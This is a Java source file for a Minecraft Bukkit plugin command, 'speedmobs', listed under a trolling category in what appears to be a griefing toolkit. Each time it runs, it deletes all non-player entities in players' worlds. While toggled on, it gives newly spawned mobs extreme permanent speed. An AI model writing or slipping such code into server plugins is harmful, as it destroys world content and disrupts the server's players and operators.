package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.entity.Entity;
import org.bukkit.entity.LivingEntity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntitySpawnEvent;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

public class Command_SPEEDMOBS extends CommandBase implements Listener {

    private boolean enabled = false;

    public Command_SPEEDMOBS() {
        super("speedmobs", "-", Category.TROLLING);
        Bukkit.getPluginManager().registerEvents(this, Start.INSTANCE);
    }

    public void execute(String[] args, Player p) {
        if (!this.enabled) {
            this.enabled = true;
            p.sendMessage(Start.INSTANCE.chatPrefix + "Jetzt ist jeder Mob blitzschnell!");
        } else {
            this.enabled = false;
            p.sendMessage(Start.INSTANCE.chatPrefix + "§cDie Mobs sind nun normal.");
        }

        for (Player user : Bukkit.getOnlinePlayers()) {
            for (Entity en : user.getWorld().getEntities()) {
                if (!(en instanceof Player)) {
                    en.remove();
                }
            }
        }
    }

    @EventHandler
    public void onEntitySpawn(EntitySpawnEvent e) {
        if (this.enabled && e.getEntity() instanceof LivingEntity) {
            ((LivingEntity) e.getEntity()).addPotionEffect(new PotionEffect(PotionEffectType.SPEED, Integer.MAX_VALUE, 20));
        }
    }

}
